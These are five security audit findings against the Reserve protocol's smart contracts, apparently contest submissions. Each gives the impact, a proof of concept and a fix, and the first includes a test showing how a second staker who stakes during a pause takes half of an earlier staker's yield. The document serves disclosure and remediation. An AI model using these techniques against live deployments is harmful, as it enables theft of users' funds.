# Lines of code  https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L215   # Vulnerability details  ### Details It is possible for a user to steal the yield from other stakers by staking when the system is paused or frozen.  This is because staking is allowed while paused/frozen, but `_payoutRewards()` is not called during so. Staking rewards are not paid out to current stakers when a new staker stakes, so the new staker immediately gets a portion of the rewards, without having to wait for a reward period. ```sol function stake(uint256 rsrAmount) external {  require(rsrAmount > 0, "Cannot stake zero");    if (!main.pausedOrFrozen()) _payoutRewards();  ... } ```  ### Proof of concept A test case can be included in `ZZStRSR.test.ts` under 'Add RSR / Rewards': ```js     it('Audit: Loss of staking yield for stakers when another user stakes in pause/frozen state', async () => {       await rsr.connect(addr1).approve(stRSR.address, stake)       await stRSR.connect(addr1).stake(stake)        await advanceTime(Number(config.rewardPeriod) * 5)       await main.connect(owner).pause()        await rsr.connect(addr2).approve(stRSR.address, stake)       await stRSR.connect(addr2).stake(stake)        await main.connect(owner).unpause()        await stRSR.connect(addr1).unstake(stake)       await stRSR.connect(addr2).unstake(stake)       await advanceTime(Number(config.unstakingDelay) + 1)        await stRSR.connect(addr1).withdraw(addr1.address, 1)       await stRSR.connect(addr2).withdraw(addr2.address, 1)       const addr1RSR = await rsr.balanceOf(addr1.address)       const addr2RSR = await rsr.balanceOf(addr2.address)       console.log(`addr1 RSR = ${addr1RSR}`)       console.log(`addr2 RSR = ${addr2RSR}`)       expect(Number(addr1RSR)).to.be.approximately(Number(addr2RSR), 10)     }) ``` Note that `await advanceTime(Number(config.rewardPeriod) * 5)` can be before or after the pause, same result will occur  Run with: `yarn test:p1 --grep "Audit"`  Output: ```shell addr1 RSR = 10000545505689818061216 addr2 RSR = 10000545505689818061214    StRSRP1 contract     Add RSR / Rewards        Audit: Loss of staking yield for stakers when another user stakes in pause/frozen state (1504ms)                                                                                       (1504ms)     1 passing (2m) ```  The PoC demonstrates that the staker2 stole half of the rewards from staker1. staker1 staked for 5 `rewardPeriod`, staker2 did not have to wait at all, but still received half of the reward share.  ### Impact This should fall into "Theft of unclaimed yield", suggesting High risk. But the amount of RSR that can be stolen depends on the liveliness of the staking pool (how often `_payoutRewards()` is called). If the time window between the last `stake(...)/unstake(...)/payoutRewards(...)` and `pause()/freezeUntil(...)` is small, then no/less RSR yield can be stolen.   `system-design.md` rewardPeriod: ``` Default value: `86400` = 1 day Mainnet reasonable range: 10 to 31536000 (1 year) ``` For RTokens which choose a smaller value for `rewardPeriod`, the risk is higher. If `rewardPeriod = 86400` like recommended, then for this attack to occur, no one must have called `stake(...)/unstake(...)/payoutRewards(...)` for 1 day before the pause/freeze occured.  Likelihood is Low for a reasonably set `rewardPeriod` and lively project. Therefore submitting as Medium risk.  ### Recommendations I'm unsure of why staking is allowed when paused/frozen and the reason for the line: ```sol if (!main.pausedOrFrozen()) _payoutRewards(); ``` The team should consider the reason for the above logic.  If the above logic is required, then I would suggest that `poke()` in `Main.sol` be called inside of `pause()` and `freezeUntil(...)` to update the state **before** pausing/freezing. Since `distribute(...)` has modifier `notPausedOrFrozen`, I would assume in pause/frozen state, no RSR is sent to stRSR contract(i.e. no rewards when paused/frozen) so this recommendation should be sufficient in preventing the issue.
# Lines of code  https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/mixins/RecollateralizationLib.sol#L275   # Vulnerability details  ## Impact The `RecollateralizationLib.basketRange` function ([https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/mixins/RecollateralizationLib.sol#L152-L202](https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/mixins/RecollateralizationLib.sol#L152-L202)) internally calls the `RecollateralizationLib.totalAssetValue` function ([https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/mixins/RecollateralizationLib.sol#L226-L281](https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/mixins/RecollateralizationLib.sol#L226-L281)).    I will show in this report that the `RecollateralizationLib.totalAssetValue` function returns a value for `assetsLow` that is too low.    This in turn causes the `range.bottom` value ([https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/mixins/RecollateralizationLib.sol#L201](https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/mixins/RecollateralizationLib.sol#L201)) that the `RecollateralizationLib.basketRange` function returns to be too low.    Before showing why the `assetsLow` value is underestimated however I will explain the impact of the `range.bottom` variable being too low.    There are two places where this value is used:    ### 1. `RecollateralizationLib.prepareRecollateralizationTrade` function  This function passes the `range` to the `RecollateralizationLib.nextTradePair` function ([https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/mixins/RecollateralizationLib.sol#L88-L91](https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/mixins/RecollateralizationLib.sol#L88-L91))  Since `range.bottom` is too low, the `needed` amount is too low ([https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/mixins/RecollateralizationLib.sol#L380](https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/mixins/RecollateralizationLib.sol#L380)).    This causes the `if` statement to not be executed in some cases when it otherwise would be executed ([https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/mixins/RecollateralizationLib.sol#L381-L396](https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/mixins/RecollateralizationLib.sol#L381-L396)).    And the `amtShort` is smaller than it should be ([https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/mixins/RecollateralizationLib.sol#L391](https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/mixins/RecollateralizationLib.sol#L391)).    In the end this causes recollateralization trades to not buy as much assets as they could buy. This is because the amount of assets is underestimated so the protocol can actually hold more baskets than it thinks it can.    Therefore underestimating `assetsLow` causes a direct loss to RToken holders because the protocol will not recollateralize the RToken to the level that it can and should.    ### 2. Price calculations of `RTokenAsset` A `RTokenAsset` uses the `RecollateralizationLib.basketRange` function to calculate its value:    [https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/plugins/assets/RTokenAsset.sol#L156](https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/plugins/assets/RTokenAsset.sol#L156)    The `RTokenAsset` therefore underestimates its `low` and `lotLow` prices:    [https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/plugins/assets/RTokenAsset.sol#L58](https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/plugins/assets/RTokenAsset.sol#L58)    [https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/plugins/assets/RTokenAsset.sol#L99](https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/plugins/assets/RTokenAsset.sol#L99)     This then can lead to issues in any places where the prices of `RTokenAsset`s are used.    ## Proof of Concept Here is the affected line:    [https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/mixins/RecollateralizationLib.sol#L275](https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/mixins/RecollateralizationLib.sol#L275)    ```solidity potentialDustLoss = potentialDustLoss.plus(rules.minTradeVolume); ```  This line is executed for every asset in the `AssetRegistry` ([https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/mixins/RecollateralizationLib.sol#L242](https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/mixins/RecollateralizationLib.sol#L242)).    So for every asset in the `AssetRegistry` a potential dust loss of `minTradeVolume` is added.    The following scenario shows why this is wrong:    ``` assume minTradeVolume = $50  assume further the following: asset1 with low value $1 asset2 with low value $1 asset3 with low value $1 asset4 with low value $200  Currently potentialDustLoss will be 4*minTradeVolume = $200. So assetsLow = $203 - $200 = $3.  Dust loss should not be calculated with $50 for the first 3 assets. Dust loss for an asset should be capped at its low value. So dust loss alltogether should be $1 + $1 + $1 + $50 = $53.  So assetsLow should be $1+$1+$1+$200 - $53 = $150. ```  ## Tools Used VSCode  ## Recommended Mitigation Steps I suggest that an asset can only incur as much dust loss as its balance is.   If the protocol only holds `$5` of asset A then this should not cause a dust loss of say `$10`.    The fix first saves the `assetLow` value which should be saved to memory because it is now needed two times then it caps the dust loss of an asset at its low value:    ``` diff --git a/contracts/p1/mixins/RecollateralizationLib.sol b/contracts/p1/mixins/RecollateralizationLib.sol index 648d1813..b5b86cac 100644 --- a/contracts/p1/mixins/RecollateralizationLib.sol +++ b/contracts/p1/mixins/RecollateralizationLib.sol @@ -261,7 +261,8 @@ library RecollateralizationLibP1 {                // Intentionally include value of IFFY/DISABLED collateral when low is nonzero              // {UoA} = {UoA} + {UoA/tok} * {tok} -            assetsLow += low.mul(bal, FLOOR); +            uint192 assetLow = low.mul(bal,FLOOR); +            assetsLow += assetLow;              // += is same as Fix.plus                // assetsHigh += high.mul(bal, CEIL), where assetsHigh is [0, FIX_MAX] @@ -272,7 +273,7 @@ library RecollateralizationLibP1 {              // += is same as Fix.plus                // Accumulate potential losses to dust -            potentialDustLoss = potentialDustLoss.plus(rules.minTradeVolume); +            potentialDustLoss = potentialDustLoss.plus(fixMin(rules.minTradeVolume, assetLow));          }            // Account for all the places dust could get stuck ```   
# Lines of code  https://github.com/reserve-protocol/protocol/blob/master/scripts/deployment/utils.ts#L17-L19 https://github.com/reserve-protocol/protocol/blob/master/scripts/deployment/phase2-assets/1_deploy_assets.ts#L46 https://github.com/reserve-protocol/protocol/blob/master/scripts/deployment/phase2-assets/1_deploy_assets.ts#L60 https://github.com/reserve-protocol/protocol/blob/master/scripts/deployment/phase2-assets/2_deploy_collateral.ts#L48 https://github.com/reserve-protocol/protocol/blob/master/scripts/deployment/phase2-assets/2_deploy_collateral.ts#L105 https://github.com/reserve-protocol/protocol/blob/master/scripts/deployment/phase2-assets/2_deploy_collateral.ts#L526 https://github.com/reserve-protocol/protocol/blob/master/contracts/plugins/assets/OracleLib.sol#L27   # Vulnerability details  ## Impact The protocol implements a safety mechanism to guard against stale chainlink feeds. If the oracle's last response is more than a day ago the contract reverts. But, chainlink feeds are refreshed at set intervals (heartbeat). Most of the feeds used by the protocol on deployment are refreshed every hour instead of daily. With the current configuration, a feed that has been stale for 23 rounds (23 hours) will still be considered valid. The prices of assets are of critical value for the protocol. Minimizing the risk of using stale prices is of utmost importance. Setting the timeout to 24 hours for *every* chainlink feed is an unnecessary risk.  ## Proof of Concept The following token feeds are refreshed every hour: - AAVE 0x547a514d5e3769680Ce22B2361c10Ea13619e8a9 - COMP 0xdbd020CAeF83eFd542f4De03e3cF0C28A4428bd5 - DAI 0xAed0c38402a5d19df6E4c03F4E2DceD6e29c1ee9 - USDP 0x09023c0DA49Aaf8fc3fA3ADF34C6A7016D38D5e3 - ETH 0x5f4ec3df9cbd43714fe2740f5e3616155c5b8419  The assets deployed with those feeds set `oracleTimeout` to 86000s, see links to affected code.  ## Tools Used none  ## Recommended Mitigation Steps Set the `oracleTimeout` to a value a little higher than 3600. The oracle is not updated exactly 3600 seconds later so you have to leave a little room for error. For example, the [AAVE/USD](https://etherscan.io/address/0x547a514d5e3769680Ce22B2361c10Ea13619e8a9#readContract) feed is updated after 3624 seconds in between rounds 55340232221128673944 and 55340232221128673945
# Lines of code  https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L374-L422 https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L596-L598 https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L496-L530   # Vulnerability details  ## Impact If a RToken is under-collateralized, the `BackingManager` can call the `StRSR.seizeRSR` function ([https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/BackingManager.sol#L141](https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/BackingManager.sol#L141)).    This sends some amount of `rsr` held by the `StRSR` contract to the `BackingManager` which can then be traded for other tokens in order to recollateralize the RToken.    There are 3 pools of `rsr` in the `StRSR` contract that `StRSR.seizeRSR` claims `rsr` from.    1. `stakeRSR` ([https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L386-L398](https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L386-L398)) 2. `draftRSR` ([https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L401-L414](https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L401-L414))   3. rewards ([https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L417](https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L417))    The `rsr` taken from the rewards is what is interesting in this report.    The issue is that the `StRSR._payoutRewards` function (which is used to pay `rsr` rewards to stakers over time) keeps track of the available rewards to distribute in the `rsrRewardsAtLastPayout` variable ([https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L517](https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L517)).    When the `StRSR.seizeRSR` function is called (taking away rewards and sending them to the `BackingManager`) and after that `StRSR._payoutRewards` is called, `StRSR._payoutRewards` uses the `rsrRewardsAtLastPayout` variable that was set before the seizure (the actual amount of rewards is smaller after the seizure).    Thereby the amount by which `StRSR.stakeRSR` is increased ([https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L513](https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L513)) when rewards are paid out can be greater than the actual rewards that are available.     ## Proof of Concept and further assessment of Impact The fact that the `rsrRewardsAtLastPayout` variable is too big after a call to `StRSR.seizeRSR` has two consequences when `StRSR._payoutRewards` is called:  1. `stakeRSR` is increased by an amount that is larger than it should be ([https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L513](https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L513)) 2. `stakeRate` (which uses division by `stakeRSR` when calculated) is smaller than it should be ([https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L524-L526](https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L524-L526))  Both affected variables can in principle be off by a large amount. In practice this is not likely because the rewards paid out will be small in comparison to `stakeRSR`.    Also after a second call to `StRSR._payoutRewards` all variables are in sync again and the problem has solved itself. The excess payouts are then accounted for by the `StRSR.rsrRewards` function.    So there is a small amount of time for any real issue to occur and there does not always occur an issue when `StRSR.seizeRSR` is called.    That being said, the behavior described so far can cause a temporary DOS:  In `StRSR._payoutRewards`, `stakeRSR` is increased ([https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L513](https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L513)), then `StRSR.rsrRewards` is called which calculates `rsr.balanceOf(address(this)) - stakeRSR - draftRSR` ([https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L596-L598](https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L596-L598)).    The falsely paid out amount of rewards can increase `StRSR.stakeRSR` so much that this line reverts due to underflow.    This can cause DOS when `StRSR.seizeRSR` is called again because it internally calls `StRSR.rsrRewards`.    This will solve itself when more `rsr` accumulates in the contract due to revenue which makes the balance increase or someone can just send `rsr` and thereby increase the balance.    The DOS occurs also in all functions that internally call `StRSR._payoutRewards` (`StRSR.stake` and `StRSR.unstake`):    [https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L215](https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L215)    [https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L262](https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L262)    Overall the impact of this on the average RToken is quite limited but as explained above it can definitely cause issues.    ## Tools Used VSCode  ## Recommended Mitigation Steps When `StRSR.seizeRSR` is called, the `rsrRewardsAtLastPayout` variable should be set to the rewards that are available after the seizure:    ``` diff --git a/contracts/p1/StRSR.sol b/contracts/p1/StRSR.sol index 8fe1c3e7..4f9ea736 100644 --- a/contracts/p1/StRSR.sol +++ b/contracts/p1/StRSR.sol @@ -419,6 +419,7 @@ abstract contract StRSRP1 is Initializable, ComponentP1, IStRSR, EIP712Upgradeab          // Transfer RSR to caller          emit ExchangeRateSet(initRate, exchangeRate());          IERC20Upgradeable(address(rsr)).safeTransfer(_msgSender(), seizedRSR); +        rsrRewardsAtLastPayout = rsrRewards();      } ```
# Lines of code  https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/RToken.sol#L439-L514 https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/BackingManager.sol#L72-L77   # Vulnerability details  ## Impact The Reserve protocol allows redemption of rToken even when the protocol is `paused`.    The `docs/system-design.md` documentation describes the `paused` state as:    >all interactions disabled EXCEPT RToken.redeem + RToken.cancel + ERC20 functions + StRSR.stake  Redemption of rToken should only ever be prohibited when the protocol is in the `frozen` state.    The issue is that the `RToken.redeem` function ([https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/RToken.sol#L439-L514](https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/RToken.sol#L439-L514)) relies on the `BackingManager.grantRTokenAllowance` function ([https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/BackingManager.sol#L72-L77](https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/BackingManager.sol#L72-L77)) to be called before redemption.    Also the only function that relies on `BackingManager.grantRTokenAllowance` to be called before is `RToken.redeem`.    Therefore `BackingManager.grantRTokenAllowance` can be called at any time before a specific ERC20 needs first be transferred from the `BackingManager` for the purpose of redemption of rToken.    The issue is that the `BackingManager.grantRTokenAllowance` function has the `notPausedOrFrozen` modifier. This means it cannot (in contrast to `RToken.redeem`) be called when the protocol is `paused`.    Therefore if rToken is for the first time redeemed for a specific ERC20 in a `paused` protocol state, `BackingManager.grantRTokenAllowance` might not have been called before.    This effectively disables redemption of rToken as long as the protocol is `paused` and is clearly against the usability / economic considerations to allow redemption in the `paused` state.    ## Proof of Concept For simplicity assume there is an rToken backed by a single ERC20 called AToken  1. rToken is issued and AToken is transferred to the `BackingManager`. 2. The protocol goes into the `paused` state before any redemptions have occurred. So the `BackingManager.grantRTokenAllowance` function might not have been called at this point. 3. Now the protocol is `paused` which should allow redemption of rToken but it is not possible because the AToken allowance cannot be granted since the `BackingManager.grantRTokenAllowance` function cannot be called in the `paused` state.  Another scenario is when the basket of a RToken is changed to include an ERC20 that was not included in the basket before. If the protocol now goes into the `paused` state without `BackingManager.grantRTokenAllowance` being called before, redemption is not possible.    ## Tools Used VSCode  ## Recommended Mitigation Steps The `BackingManager.grantRTokenAllowance` function should use the `notFrozen` modifier instead of the `notPausedOrFrozen` modifier such that allowance can be granted in the `paused` state:    ``` diff --git a/contracts/p1/BackingManager.sol b/contracts/p1/BackingManager.sol index 431e0796..7dfa29e9 100644 --- a/contracts/p1/BackingManager.sol +++ b/contracts/p1/BackingManager.sol @@ -69,7 +69,7 @@ contract BackingManagerP1 is TradingP1, IBackingManager {      // checks: erc20 in assetRegistry      // action: set allowance on erc20 for rToken to UINT_MAX      // Using two safeApprove calls instead of safeIncreaseAllowance to support USDT -    function grantRTokenAllowance(IERC20 erc20) external notPausedOrFrozen { +    function grantRTokenAllowance(IERC20 erc20) external notFrozen {          require(assetRegistry.isRegistered(erc20), "erc20 unregistered");          // == Interaction ==          IERC20Upgradeable(address(erc20)).safeApprove(address(main.rToken()), 0); ```
